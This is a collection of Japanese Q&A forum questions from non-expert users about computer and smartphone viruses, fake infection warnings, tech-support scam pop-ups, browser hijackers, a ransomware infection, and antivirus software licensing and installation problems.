セーフモードはできる chkdsk　／ｆ効果無し システムの修復と回復は効果無し BIOS情報初期化も効果無し Kaspersky最新版 ＤＭＭのｼｬﾄﾞｳﾊﾞｰｽやるためにインストール時ウィルス反応あり こんな感じです。 朝まで使えてました。
ノートPCはネットに繋がないで使用してたので、セキュリティーソフトはいれてません。 このノートPCを外出先で、ネットに繋げなければならない事情が発生しました。 アイフォン経由で繋げれば、アイフォンが侵されなければノートPCも一応の安全は保たれると判断するのは危険ですか？
怖くてすぐに画面を閉じてしまい、タイトルに書いてあるものと全く同じではないかもしれませんが、「ハッキングを試みた形跡が見つかりました」といった類のエラーメッセージが出てきました。 使用しているブラウザーはInternet Explorerです。 スマホなどで「○○個のウイルスが検出されました！」といったものも見た事はありますが、それについては絶対押してはいけない、と知っていました。 ですが今回は初めて見た画面だったということと、何やらドライバーの更新(？)も要求してきました。 恐らく何かしらのクリック詐欺かとは思っているのですが、心配なのでどなたかお答えいただけると幸いです。
ウイルスベンダーがウイルス定義データベースに登録するために日々ウイルスの採取を行っていますが、これはとにかく悪さをしたものだけが発見されるのであれば、昨今はやり始めた個人標的型の監視を目的としたボットウイルスなどは見つかることがないのでしょうか。
ウイルスかなにかに感染したのでしょうか？ 悪意のあるプログラムであれば、削除する事は可能でしょうか？ ※画像添付をご覧ください。
win10 64bit us版 の 最新ビルドバージョンですけど、ISOでDLしたものですが、先ほどインストールした直後(ネットワークには繋がった状態でインストール作業はしています。)に、ウイルスと判別されてるファイルが２個検出されていました。 プリントスクリーンのコピーを張り付けておきます。 ウイルなのか削除して良いのか、有り得る事なのか、対策など教えて頂けますと助かりますけど・・
さっき、あなたの端末はウイルスに感染しています。修復を開始するにはOKを押してください。とホーム画面を開いていたら出てきました。 これってやばいですか？ それ以降ネットが使えなくなってるとか、そういうのは無いです
初心者でもウイルスの検索と削除はできますか？
iPhoneがウイルスに感染しました。 ウイルスを駆除 をタップしたら、アップストアにとばされ、メルカリが出てきました。 どうすればいいのでしょうか。
iPhoneのメールに、zipというものが添付されたメールが頻繁に来るのですが、そちらは開くとウイルスに感染されたりしますか？また、そのzip付きメールの送信者は知らない人で、文章も名前も英語なので、海外の人っぽいです。
先ほど095-***-****という見知らぬ電話番号から自分のスマートフォンに電話がかかってきたので、その電番を調べてみたところ、長崎大学医学ｳﾝﾀﾗｶﾝﾀﾗという結果が上位の検索結果で表示されました_(-ω-`_)⌒)_ 僕は愛知に住んでおり、長崎に行ったこともないし、そんな大学聞いたこともないのですが、これはウイルス等ではなく100%『間違い電話』という位置づけで大丈夫ですよね？ 粗末な質問で申し訳ないです 回答おもちしてますΩ
パソコンがウイルスに感染してるか知りたいです。 無料でダウンロード無しで感染してるかを知ることはできますか？
KINGSOFTinternet security　が中国公司がやってるソフトとはじめて認識。。 コレが出て初めてギョッとしたので。。 コレ使っててどうなん？ 不要ソフトクリーンとかけっこう消されたファイルある。。┐(´-｀)┌ 無料だからって、けっこうtopサイトアクセス強制とか強引なとこが目立ったのは、こういう中国的性格だったのね？
アウトルックexpressで検索したところ、 http://outlook_express.ja.downloadastro.com/ 　以下がヒットしましたが 　WinZip Driver Updater 　が感染して、ウイルスバスターからもウイル発見とあり、直ぐ消しました。 アウトルックexpress　の公式サイトのアドレスを教えて頂きないでしょうか・・・ 　よろしくお願いいたします。
ウイルス対策ソフト（例えばフレッツウイルスクリア）とファイアウォール（例えばWindowsファイアウォール）の違いは何なんでしょう？？
デスクトップに「TTi HE Download.exe」という「ウイルスバスター」のアイコンがあります。これは削除してもウイルスバスターは残りますか
パソコン購入した超初心者ですが、お尋ねします。購入当初は『ウィルス』の 問題について殆ど関心が無く、無知でした（現在も）が、知れば知るほど怖くなって 購入した某家電量販店に聞いたところ、購入時の契約によってソースネクスト社の 『ＺＥＲＯスーパーセキュリティー』が導入、設定されているのでウィルス対策がされている、 とのことでした、教えていただきたいのは、上記の対策だけで充分なものなのでしょうか？ 皆さんはどうされているのでしょうか？
Xn--Gck8b2a7k3a9c.comというサイトは安全ですか？ ウイルスサイトですか？ 回答お願いします
Windowsサーバ2012 R2環境にて、McAfee Agentがインストールされているのですが、 VirusScan Enterpriseが入っておりませんでした。 この場合、ウイルススキャンは実行されているのでしょうか。 【補足】 ePOサーバのMcAfee ePolicy Orchestratorで一元管理しています。
dropboxstorage このファイルいったい何者　　それからui-stringsこのファイル２０個ほどあります。cpuがAMDA2-1800APUこれで対処できるのでしょうか。
パソコン初心者です。 今現在アンインストールしたいやつがあるんですが、なんだかノートンがブロックしているようで、アンインストールできません。 またデスクトップ上にもあるんですが、それも削除できなかったり、ごみ箱にもいれることができません。 どのようにすればできるのでしょうか？ 教えてください、宜しくお願い致します。
現在、マカフィーのセキュリティソフトを契約しております。 契約時は１ライセンスで自宅のデスクトップ用に購入しましたが、 その後PCが増え、今ではデスクトップ１台＋ノートPC２台の合計３台のＰＣがあり、 ２台目、３台目のノートＰＣにもインストールしてマカフィーセキュリティを効かせております。 しかしながら、マカフィーのマイアカウントを確認したら、 　「１ライセンス：使用中３、超過２」と、アラームっぽい表示がありました。。。 お伺いしたいのは下記３点です。 １）このままこのまま放っておいていいのでしょうか？ 　　今のところ、超過分に関しては追加購入や請求はありませんが、 　　このままこのまま放っておいていいのでしょうか？ 　　 　　セキュリティ機能が弱い（？）とか、ある日突然使えなくなる・・など、 　　ネガティブ要素はあるのでしょうか？ ２）請求されるのでしょうか？ 　　仮に、「使った分は支払いなさい！」となった場合、請求はいつ来るのでしょうか？ 　　ちなみに購入した１ライセンスの更新は、2018年９月と、まだ２年先です。 　（2018年９月に過去にさかのぼって請求される？？） ３）乗り換えはできないのか？ 　　マカフィーのＨＰによると、ＰＣ（Win・Mac）・スマホ・タブすべてのデバイスに 　　入れ放題のソフトがあり、現在使っている１ライセンスのみより安価です。 　　こちらの商品を購入する場合、現在のライセンスから乗り換え的なことはできないのでしょうか？ 　　現在使っているライセンスは、 　　　DELL経由で購入したもので、2018/9月まで有効です。 どなたか教えてください。 よろしくお願いします。
真偽は良く分からないのですが、いきなり携帯の画面にウィルスに感染しているとの警告みたいのが 出て、その警告にこのアプリにインストールして（某アンチウィルスアプリ）対処してくださいというようなことが書かれていたので、その言う通りにアプリをインストールしスキャンを行い一応そのアプリではセーフティと表示されウィルスマークのところが０と表示されたので（多分ウィルスがなくなった。という様なメッセージだと思うのですが。）大丈夫かなと思って昨日使用しているのですが本当に大丈夫なのでしょうか？ 後、その安全ですみたいなメッセージが出たあと、課題でどうしてもパソコンにメールで画像を送らなければいけなかったので送ってしまったのですが、もし携帯からウィルスが駆除されていなかった場合その携帯から画像をメールでパソコンに送ったら パソコンは感染していなくても携帯からデータを送ったことで感染してしまうということはあるのでしょうか？ それで今日そのアプリについて開発元が中国っぽいことが分かったのですぐにアンインストールしたのですが、昨日1日はそのアプリを入れて携帯を使っていたので心配です。 今これを送るのに使っているパソコンは大丈夫です。
ウイルスとはなんですか???
ウイルスに感染してPCを壊されることはあるのでしょうか? BIOSのデータを破損するウイルスがありますよね。 BIOSのデータをハードに異常な負担をかけるデータに書き換えられたら、 ハードを壊すウイルスは有り得ますよね?
先ほど、ある検索ワードでGoogle検索をかけ、出てきたページをクリックしたところ、暫くして、バッテリーが破損、2個のウイルス感染、すぐに対策ソフトダウンロード云々の表示がバイブレーションとともに出てきました。戻るボタンを押しても解消されないので、閉じるボタンで対応後、履歴を消去しました。インストール済みのnortonでチェックしてみましたが、ウイルス感染はしていないようです。が、ここ数日で似たような警告に3回ほど遭遇しており（いずれも異なる状況下）、少し不安になっています。ちなみに、iPadで同じ検索ワードでGoogle検索をかけ、同じように出てきたページをクリックしても何も問題はありませんでした。やはり、androidスマホの方に何か問題があるのでしょうか？どちらもブラウザはchromeを使いました。
Avira Free Antivirus　がインストールできないです。 今朝、Windows7（Ultimate）をCドライブをフォーマットしてインストールしました。 （Win10からWin7に戻しました） 今まで使っていたAvira Free Antivirusをインストールしようとしており 赤色の棒がくるくる回る「インストールの準備中」という画面になるのですが その後にその画面が消滅してしまいます。 何回やっても同じでインストールできません。 どんなことが原因として考えられるでしょうか。 よろしくお願いいたします。
PCのウイルス？についてです。助けて下さい。 パソコンでサイトを開こうとしたら、変な画面が出てきて、ブーブーブーって音を出して、インターネットが使えなくなりました(今は使えます)。 変な画面にはウイルスに感染しています。Windowsサポートの電話番号(忘れてしまいました)に電話してください、と書かれてました。そしてファイルやクレジットカード番号が抜かれるって書かれてました。okや画面を閉じる×ボタンを押しても同じ画面が出てきました。 他のソフトは使えたので、AVGを開いたら、完全な保護のために再起動が必要ですって書いてあり、クリックして再起動したら変な画面はなくなってました。 これってウイルスなんですか？ファイルやクレジットカード番号は盗まれてしまったんでしょうか？これからどうすればいいんでしょうか？ とても不安です。どうかお力を貸して下さい。よろしくお願いします。
7年程前に購入したきりネットに繋いだ事がないパソコンを、家のWi-Fiでネットに繋げてWindows7からWindows10にアップデートしようと思うのですが、アップデートの最中にウイルスに感染する可能性はありますか？ ウイルス対策ソフトは入ってません。 また、セキュリティ面を考慮した場合、Windowsアップデートを先にすべきか、ノートンなどのウイルス対策ソフトを先にインストールするべきか、どちらがいいでしょうか？ 上記以外にセキュリティ面で他にすべき事はありますか？
ノートンに電話もしくはチャットをしようとすると、質問内容が消えてしまって続けることができません。ノートンに直接聞けないし。困ってます。
この度、パソコンにウイルスが感染し、保存していたドキュメントなどが全て消えてしまいました(対策ソフトが切れていたので、どんな種類のもの に感染したかはわかりません) そして初期化を依頼したのですが、リカバリーディスクがなかったので仕方なく、Dドライブだけは残してCドライブのみ初期化するという手続きを行いました。 クレジットカードなどは止めたので悪用の恐れはないのですが、心配しているのは、初期化が済んだ後、今後Yahooや他のサイトにログインする際にIDやパスワードが盗まれてしまうのではないかということです。 仮にウイルスがDドライブに居て、今回の初期化によっても除去できなかった場合、 IDなどを他のサイトで入力することで、それを読み取られてしまう危険はあるのでしょうか。 もしくは、何かウイルス対策ソフトを入れておくことでこの事態は防げるのでしょうか。 あまりにも無知なため、どなたかご教授していただければ幸いです。 宜しくお願いします。
回答お願いします。　 ESETウイルス対策ソフトをインストール後、携帯に保存してある画像をパソコンに保存するためUSBにつないだのですが保存できません。　パソコンのドキュメントのPCのところに使用している携帯ASUSとでますがそこをクリックしてもSETUP等のファイルがでてきます。 画像保存までたどりつきません。　　ウィルス対策ソフトの設定などいろいろ試みてますが解決できません。　　USB接続事態ブロックされているのでしょうか？
先日、冒頭を見逃して気になったTVドラマについてスマホで調べていたらあるサイトにたどり着き、状況は詳しく覚えていませんがバイブ振動とともに警告メッセージが表示されました。 警告の内容は「このスマホはウィルス感染によりバッテリーが破壊されましたので、この手順（手順らしき説明が表示されており）に従って修復を行ってください」というもでした。ブラウザバックをしてもそのページを離れられず、再度警告振動とメッセージが表示され、よく見ると確認のための「OK」ボタンらしきものがありましたが、その警告ページ自体が怪しいと思い、「OK」を押さずにスマホの電源を落としました。 機種替えをした後うっかりスマホ用アンチウィルスソフト（スマホ用ウィルスバスター）を入れ忘れていたので、スマホを再起動後、アンチウィルスアプリのインストールとスキャンを行うと異常なしという結果が出ましたが、それでもまだ不安です。 こういったアクシデントでウィルス感染によるバッテリー破損（破壊）ということは起こりうるのでしょうか？そして、この状況にどう対処すればよいでしょうか？ 同じような経験をした方、お詳しい方、おられましたらご教授お願いいたします。
昨日パソコンがウイルス感染してしまったのですが、 この場合YahooやFacebookなどのidやパスワードも全て変えたほうがよいのでしょうか。もしくはパスワードだけで良いのでしょうか。 また、パソコンでネット銀行にログインしたことはなく、するならいつも携帯だったのですが、 この場合パソコンのウイルス感染でネット銀行のパスワードなどは盗まれていないと考えてよいのでしょうか。 また、iPhoneは感染していないので、パスワードなど変えるならiPhoneでと思っているのですが、これは問題ないですよね…？ 色々調べてみてはいるのですが情報がたくさんあり、よくわかりません。 また、感染前に何度かクレジットカードで買い物しており、それをAmazonなどのサイトで保存もしているのですが、この場合もカードの停止措置などとるべきでしょうか。 どなたかお返事いただければ大変嬉しいです。どれか一つの質問にだけでも構いません。とても心配なので、どうぞ宜しくお願い申し上げます。
Win8.1からアップデートした。Wni１０　Home　64bit　を使用 しています。 Windows Defenderを有効にしても直ぐに無効になります。 プログラムのアンインストールでマカフィーを削除しましたが、 Windows Defenderを有効化できません。他にウィルス対策ソフ トがないか確認しましたが見当たりません。 アップデート前のWin8.1の時はWindows Defenderを有効化でき ていました。 どなたか解決法をご教授ください。
ごめんなさい。先ほどhttp：//eazel.com/イメージズに感染したと質問した者です。 グーグルクロームに切り替わっているから、このような画面が表示されるのでしょうか？ グーグルクロームも削除できません。 普段はインターネットエクスプローラでhttp：//eazel.com/イメージズを表示が出て ヤフーを見たり、グーグルクロームからヤフーを見ています。
数日前に　OSをWindows7から　Windows10に　アップデートしました。 「ノートン　ライブアップデート 　　　　要再起動 　　　　最新の更新を入手するにはシステムを再起動する必要があります。 　　　　どう処理しますか？　　　　　　　　　　　　　　　　　　　　　　」 　というメッセージが出るようになりました。 　ノートンは継続して使用していますが、前にも何かメッセージが出て、必要性を訴えるようなメッセージだったので実行したら、検索エンジンがグーグルからノートンに変えられてしまい、大変な思いをしました。今回もそうなるのでは・・・と不安です。 　そんなことは心配なく、セキュリティのアップデートなのでしょうか？ 　再起動をOKすると、何が変わるのでしょうか? 　OKしてよいものかどうか、わからないので、ご教授ください。 　よろしくお願いします。
おかしなものをダウンロードしてしまったようで、パソコンを立ち上げると、 イメージズhttp://en.eazel.com/と表示されてます。 こちらとしては立ち上げた時にヤフーや楽天画面が表示されたら、いいのにと思います。 ヤフーを見るときはイメージズhttp://en.eazel.com/が表示されていて★マークをクリックすると ヤフーがクリック出来るようになっていて、ここからヤフーを見ます。 イメージズを表示したくなくて右上歯車からインターネットオプション、ヤフーアドレス入力 現在のページ使用、ＯＫを、やってもイメージズと表示されます。 自力では削除は出来ないのでしょうか？ （パソコンはウィンドウズビスタです。）
セキュリティソフトでウィルススキャンをしたら、あるDLLファイルが削除されましたが、RegSys32に登録されていて、再起動する度にそのファイルがないとRegSys32のエラーメッセージが出るようになってしまいました。 既に削除されたDLLファイルのRegSys32に対する登録抹消方法をご教授願います。 なお、レノボのH320（Core i3)をWindows10にアップグレードし、メモリも４GBに拡張しています。
wordで「サブスクリプションの有効期限が切れています」と出ますが サインインしようにもMicrosoftアカウントは関連付けられておらず、 昔高専生に配布された最新のofficeなのでプロダクトキーも持っていません 一体どうやって認証すればよろしいのでしょうか？ また、更新すれば「サブスクリプションの有効期限が切れています」というのが消えると勘違いして更新してword、Excelなどを2016に更新してしまいましたが Word、Excelなどの2013を再インストールしたいのですが、こちらでもプロダクトキーが必要なそうなのです プロダクトキーなしでできる、またはプロダクトキーを再発行していただける方法はないものでしょうか？
携帯にウィルス対策をせずに買い物をしたら Googleなどにつなぐ時ウイルスに感染の恐れあり！といった画面が出てしまい見たいところが見られなくなりました。まずいのでしょうか？ アドレス変えただけで回避できますか？
ウィルスソフト何ですが、パソコンのソフトで無料の奴で優れもの知ってるかた教えて下さい。OSはWindows7です。
キングソフトインターネットセキュリティをアップロードしたら「天気ボール」が付いてきたのですが、温度が明らかに違います。みなさんは正しく表示されていますか？
スマホの画面下に謎の中国語が出てきました。 これはウィルスですか？ もしよければなおしかたとかありますか？
無料のウイルスソフトだけで、パソコンの環境は保護できますか？
パソコンの無料ウイルス対策ソフトのおすすめを教えてください。
買ったPCに付いてた期間限定のマカフィーリブセーフの期限が切れました 他のウィルス対策ソフトはまだ入っていないのですが 期限切れのマカフィをクリックするとフルスキャンしてくださいとか なんかまだ仕事しますよ～みたいなこと言って来るのですが こいつはまだ何かしら「無いよりマシ」ってぐらいは、役に立つのでしょうか？
スパムメールのメールに添付されている圧縮ファイルを開いてしまいました。デスクトップにショートカットができただけで、現象は出ていないのですが、ウイルスに感染しているかどうか確認する手段がありますか？ 　ウイルスバスターの提供する、WEBチェックで感染の有無が確認できますか？ ご教示願います。
現在Norton360を使っているのですが、正常なソフトをウィルスだと誤認識することが多いです。そこでアンティウィルスソフトを買い換えようと思っているのですが、どんなものが良いでしょうか？教えてください。 よろしくお願いします。
Norton360がインストーラーをウィルスだと誤認識するので、一時的に無効にしてインストールしてみたところ、DOS窓のようなものが画面に出てくるようになりました。Yesをクリックしたところ、DOS窓は消えてなくなったのですが、それ以降うんともすんとも言わず、インストールの過程には進みません。これはどうしようもないと思い、あきらめました。その後Norton360を通常の設定に戻してから数分たったころ、Norton360が、このアプリのインストーラーが危険なので削除した。とのメッセージをだしました。どうなっているのかさっぱり分かりませんが、どうすればこのアプリをインストールできるでしょうか？なおインストールするアプリは、 http://freesoft-100.com/review/asr.htmlです。 よろしくお願いします。
表題の通りです。どうやったらアプリケーションをインストールできるようになるのでしょうか？ よろしくお願いします。
富士通　lifebook Win 7 です。 Win10 のダウンロード＆インストールに先立ち、Win7のバックアップと復元ディスクの作成をしようとしたのですがノートンが邪魔をしているようで途中で先に進まなくなりました。　よってNorton Internet Security　を削除ツールで削除しました。　引き続いてWin7のバックアップと復元ディスクの作成は無事終了できました。 次に削除した　Norton Internet Security を元通りに再インストールしたいのですがその方法がわからないのでどなたか教えていただければ幸いです。その製品は富士通のサイト　azbyclub 経由で購入したもので有効期限が満了する前に自動継続する契約となっています。
先日クロネコヤマト（mail@kuronekoyamato.co.jp）からの下記メールが届きファイルが添付されていました。 うっかりファイルをクリックしてしまったのですが何の反応もせず開くことはありませんでしたがウィルスに感染してしまったのではないかと不安です。 今後どう対処したらいいのでしょうか、ご教授よろしくお願いいたします。 「お届け予定日・時間帯:2016-07-04 お届け先ご住所: （******** ***** **） ヤマト運輸荷物お問い合わせ番号（伝票番号）1234-5678－9101 お届け予定日・時間帯 同一の荷物で受け取り希望日時を2回以上変更される場合は、「お荷物お届けの ご案内メール」よりご確認いただけますお近くのヤマト運輸サービスセンターま でご連絡ください。 メールの再送は行っておりませんのでご注意ください。」
ＡｄｗＣｌｅａｎｅｒで見たらファイルでＳｙｓｎａｔｉｖｅという項目がでて消しても復活するしそのフォルダのデータを消してももう一度起動するとまた復活するので消し方を教えてください。 （用事があるので返信は１６時いこうになります。）
ネット検索しようとすると、「このサイトからのメッセージ」などという囲みボックスが 現れ、OKのボタンを押すまで消えてくれません。それを回避しようとｘをクリックしても閉じられず、電源を切るしか逃げられません。 ネットと言っても、ヤフージャパン直の画面は見られるのですが、そこからニュースをクリック していくと必ず、同じボックスが出現し、結局それらのサイト見ることができません。 他のパターンでは、次の電話番号に電話してくださいという表示が出て、PCがビービー と鳴り出します。これも電源を切るしか手がありません。 その他では、JAVAが古いバージョンなのでアップデートしてくださいというメッセが出ます。 しかし元々のJAVAはきちんとアップデートされているので、これもウィルスと思います。 一度表示された電話番号に電話してみましたが、明らかに日本人以外の人の日本語対応で、 不審に思い切りました。 スカイプは怖いので終了という状態にいつもしています。 マカフィーのセキュリティーソフトはインストール済みで何度スキャンしてもこのPCは保護されていて安心です。ウイルスはブロックしましたなどと表示されてくるのですが、実際にネット接続が出来ない状態です。とても困っています。助けて下さい。
とあるサイトにアクセスしたところ、 「ウイルスに感染しました」と警告文（セキュリティソフトではなくサイトのメッセージ）が出現し、「ウイルスを削除する」というリンクが貼られていました。が、クリックせずサイトを閉じ、セキュリティソフト（カスペルスキー）で完全スキャンしたところ脅威は検出されませんでした。 この状態ならば基本問題ないですよね?　 また、もしも「ウイルスを削除する」というリンクをクリックしてたら感染していた可能性があるのでしょうか？
http://www.itmedia.co.jp/enterprise/articles/160 … ITmedia エンタープライズ > セキュリティ > 2016年06月30日 07時45分 更新 Symantecのウイルス対策基幹部分に深刻な脆弱性、法人・個人全てに影響 この記事によると アップデートを適用するように呼びかけている とありますが、これは　 Ｎｏｒｔｏｎ　Ｌｉｖｅ　Ｕｐｄａｔｅのことでしょうか それとも別のアップデートでしょうか わかる方、教えてください よろしく、お願いします
先日私のpcがウイルスに感染した恐れがあった為、pcを出荷状態に戻しました。 おそらくそれでウイルスの脅威からは逃れられたと思うんですが、1か月くらい無料お試しのノートンが復活しました。 これを利用すると定期的にpcを出荷状態に戻せば半永久的にノートンが無料で使えてしまうわけですが、「実は利用規約違反」や「実はバージョン古くてウイルス感染」とかが怖いです。 使わないほうがいいでしょうか。
mshta.exe Microsoft(R) HTML アプリケーション ホスト に関連した広告 不正ポップアップの削除 アダルトサイトの不正請求画面を削除出来なくて 困っています。教えて下さい。
pc初心者です。 ｐｃにウイルスが入ってしまったらパソコンの初期化でウイルスはいなくなりますか？ 使っているパソコンは　デル　オプティプレックス３０２０です よろしくお願いします。
Windows10です。 最近Norton Internet Security　のシステムの完全スキャン中に勝手に停止するようになりました。どこをクリックしても反応せず（フリーズ状態）やむを得ず電源プラグをいったん抜いてＰＣ本体を起動させました。 ヘルプを参照して「削除と再インストール」を実行してしばらく直っていましたが先日同現象が再発しました。　前回同様「削除と再インストール」を実行しクイックスキャンで正常動作を確認後　システムの完全スキャン　を実行したところ作業中の表示が出ているにも関わらず スキャンファイル数1,205,796のままで起床の朝を迎えました。そして気が付いたのですが６４ビット動作のはずがいつの間に３２ビット動作になっていました。　そのためかクリックに対する反応が極端に遅くなっています。　併せて６４ビットに戻す操作方法も教えていただければ幸いです。 以上複雑怪奇な質問で申し訳ありません。　何卒よろしくお願い申し上げます。
Windows7　Norton Internet security を使ってます 画面右下「フラッグに赤×」が出ている 「ファイアーウォール、スパイウェア対策、ウイルス対策」が無効になっている 何度試しても有効に出来ない 「パワーイレイサー」を使ったが、改善しない ノートンの「サポートチャット」につながらない（エラー404） まったくの素人、詳しくないので（用語とかチンプンカンプンです）助けて下さい
先ほどWindows7のパソコンのインターネットを久しぶりに繋げられることができました！ そしたらマカフィーのセキュリティーの安全期間がきれてるとの知らせがきました。 パソコンの安全のため購入する予定です。 しかしメールアドレスが必要とあり、 以前使用してたメールでは使えないみたいで… どうしたらよいでしょうか？
購入時はWin8、その後8.1→10と、自分自身でupして来ました。 このPCで、次の通り表示されます。 新しいHao123をスタートページに設定しませんか。 □次回からこのメッセージは表示しない。 次へ　キャンセル Hao123は必要ありませんので、□にチェックを入れて、「次へ」を選びました。 その後、Hao123なるものは現れず、処理としては正しかったと思っていました。 ところが、半年ぐらいしてから同じ表示が出てきました。 これは先方が、不要の連絡を受けた人へ意図的に送っているのでしょうか、それとも不要の処理が誤っていたのでしょうか。ウイルスのような気もします。 如何考えたらよいでしょうか。
先日、ファイルの拡張子が「crypz」に変わってしまうウィルスに感染しました。 ＰＣを起動すると英語表示のウィンドウが勝手に開きます。 数日前から一部のサイトにアクセスしたら 警告音が鳴って閲覧したことへの料金請求をしつこくする説明が何回も表示され 何回も（✕）閉じないといけませんでした。 これは無視すればいいとおもい✕で済ませておりました。 いちお、Malwarebytes Anti-Malwareというソフトをネットから落として使い 不審な感染ファイルをスキャン＆除去しておきました。 このウィルスはネット上の記事を見るかぎり新しいウィルスのようです。 私が心配していることとして、他のネットのコメントでも目にしましたが クレジットカード、ネット銀行、ネットショッピング通販での個人情報 メールアドレス　パスワード　IDなどの ネット上で使用した個人情報が抜かれ盗まれ、不正利用されていないかということです。 ■以下、最新のセキュリティについてお詳しい方にお聞きしたいことです。 ①、このウィルス・スパイウェアを駆除できるアプリ、ソフトウェアを教えてください。 　対策用の今後使用すべきものを、何かご存知でしたらお願いします。 　無償の物、PCショップで購入できるもの何かあれば。 ②、感染により拡張子がcrypzに変わってしまった画像、動画、文書、ファイルは開いても 　すべて英数字の文字化け状態です。まったく見ることができなくなりました。 　一部しかバックアップ・保存・USB等へのコピーをしておりませんでしたので、 　残りは破棄し捨て、諦めるしかないのか？ ③、メールアドレス　パスワード　IDなどネット上で使用した個人情報は 　　とりあえず、すべて変更すればよいでしょうか？ 　　ネット銀行やクレジットは後日、不審な使用がないか確認します。　　 最新のウィルス感染ということで焦っております。 セキュリティについては疎く、対策についてお願い致します。
ノートンインターネットセキュリティ（体験版）を使ってますが二日前ぐらいから PCを起動すると（スパイウェアと不要なソフトウェアの対策・ウイルス対策・ネットワークファイアウォール）が無効になっていますとアクションセンター旗のマークより表示されます。 PCは、windows7(64bit)です。 無効を有効にしても直りません ノートンインターネットセキュリティをアンインストールしサイドインストールをして、ライブ・アップデートをすると直りますが1日経つとまた同じ状態になります。 なにかウイルスかスパイウェアに感染・侵入されているのでしょうか？ 初心者の為詳しく教えて頂ける方回答宜しくお願い致します。
【JTBで個人情報流出】いまどきの標的型攻撃の怖さと対策。 対策は、コンピュータウィルスに感染しても「外部にデータ流出しない仕組みが必要」と専門家が言っていました。 コンピュータウィルスに感染しても外部にデータが流出しない仕組みとはどうすれば良いのでしょうか？
エロ動画を見ようとして開いたら、「１３個のコンピューターウイルスに攻撃されています。今アクションを起こさないと・・」なんとかかんとか書いてあって、びっくりしてすぐ落としてしまいました。これってやばいですかね？今のとこ何にもパソコンはなっていません。心配です。詳しい方がいましたら回答お願いいたします。
ノートンのことで質問です ノートンをちょっと前に買いましたそして昨日ぐらいから試験期間状態３日とかでてくるのは？ 何かをしないと買った意味ないってことですよね？ 何かとは「 今すぐアクティブ化 」をしろってことでいいんですか？？
取引先を装った不正メールの添付ファイルを開いたことで、旅行会社のPCがウイルスに感染し、個人情報が流出したそうです。 旅行会社のパソコンにもセキュリティソフトは入っていると思いますが、なぜ発生を防げなかったのですか？
お世話になります。 県外に住む人にメールする際、あまり親しい人では無いので「気温の話でも盛り込もうかな」と思い、その県の夏の気温を知りたくて検索をかけました。 最初の方に出てきたサイトがAccuWeatherだったのですが、きちんとした日本語だったし検索の上位に出てきたので、日本の天気のサイトだろうと思い疑いもせずに開いたところ海外のサイトでした… びっくりしてすぐ閉じ、AccuWeatherについて検索したところ結構古いアメリカの会社のようでしたが、調べていくと悪名高いバイドゥも関係しているようで「開いて良いサイトだったのか？」と不安になってしまいました。 どうもバイドゥが関係するのはアプリの方で、しかも勝手に？AccuWeatherの情報を参照しているだけでアプリ自体は「The Desktop Weather」という物だという意見もありましたが… ちなみにMacを使っていて、セキュリティソフトはESET Cyber Security Proを入れているのですが、AccuWeatherのサイトを開いても特に警告はありませんでした。 また詳細検索もしてみましたが感染は見つからなかったです。 アプリはともかく、AccuWeatherのサイト自体の悪評(当たる当たらないではなくウイルス関連)は見つけられなかったのですが、サイト自体はきちんとしたもので、特にウイルスやマルウェアが仕込まれているような物ではないと考えていいのでしょうか？ お詳しい方、ご回答よろしくお願いします。
ネットインストールでなく、単体ファイルからXPにインストールできる ウイルス対策は無いですか。 もう、全くないですか。 検索しましたが、見つかりませんでした
いつの間にかGoogleが開けなくなっていました。 エラーが起きたため、ブラウザーが開けませんというのが何回も出てきます。ほかのゲームは今のところはできます。LINEなども。 ウイルスにかかったかもという心でいっぱいです。 助けてください。
あるサイトを閲覧したら、勝手にテキストファイルをダウンロードされました。開くと暗号みたいに文字がならんでました。ファイルを消去した後、再び同じサイトを閲覧したら、今度は音楽ファイルが勝手にダウンロードされました。ファイル名は両方とも同じで｢11Bird_Loon_SingleCall｣でした。ウィルスでしょうか？
Chromeで、とあるサイトを開いたら画像のようなページが出てきてしまい困っています。 怖くてまだなにもしてません、どうすればいいのでしょうか？ 無視して閉じるとかウイルス対策アプリとかしなくちゃいけないんですかね… わかる方いらっしゃいましたら至急お願い致します（ó﹏ò｡）
Mac Book Proを使用していますが、 PCには非常に疎く困っています。 何かに感染したのか、 画面が黒い時や、黒い場所が、 赤い模様のような…チラチラと光ります。 急にそうなりました。 全体的には、赤い目玉？…的？のような感じです。 上手く説明できず、わかりにくくて申し訳ないのですが、 見るからに良くなさそうな感じで…気持ち悪く不安です。 これは、どうすれば改善できるでしょうか？ Mac Keeper？などもありますが、 金額部分などが英語だったりで、なかなか理解できず、利用していません…。 できるかぎり、 簡単でわかりやすい方法を教えていただけると助かります。 専門用語も全くわからないので、 ご説明いただくのも面倒だとは思いますが、 ド素人で知識が無くてもわかるよう、 優しく教えて下さる方がおられましたら ぜひ教えていただきたく思い、質問致しました。 どうぞよろしくお願い致します。
コンピューターウィルスに感染してしまいますか？
Firefoxを使っていたら突然この添付画像のような画面が出てきました。日本語があきらかにおかしいのでウイルスの類かと思うのですが、okのボタンを押しても大丈夫なのでしょうか。早く消したいので困っています。この手のことに詳しい方、是非ともご回答の程よろしくお願いしますm(_ _)m
パソコンのスキャンについて質問です。アバストの無料のやつを使っています。 本日フルスキャンするといつもの半分の時間３０分で終わったんですが、スキャンしたファイルなども半分になってますが原因わかりますか？ スキャンの設定などは何も変更していません。ＨＤＤの使用容量見ても以前と変わってませんでした。
原因はウィルス感染ですか？ブラウザで保存したパスワード以外で、漏えいしてしまう場合は考えられるのでしょうか。
以前に　友人のPCで　ネットのみ固まる　フリーズするので ウィイルスソフトのDLできないので　USBにいれて対応できるかと質問した者です。 https://oshiete.goo.ne.jp/qa/9232379.html USBにウィイルスソフトをいれて　友人の家に行きインストールしようと思っていたのですが 昨日仕事で使う為　上司にUSBを渡したのですが 取引先に忘れてきたといわれ　USBがないのです 今日友人の家にいくのですが ネット開くと固まったり　すごく遅かったり（何かするのに数十分かかるそうです）するので 友人PCでソフトDLできません このような場合　どう対処したらいいでしょうか？ 私もPCに詳しいわけではないので　対処方法を教えてください
保護されていないとメッセージ出るので、更新しようとすると セキュリティセンターにより更新の確認が行われます。 更新がある場合は・・・アイコンが表示されます。 と出て更新が始まるのですが、状態は改善されません。 どなたか詳しい方いませんか。
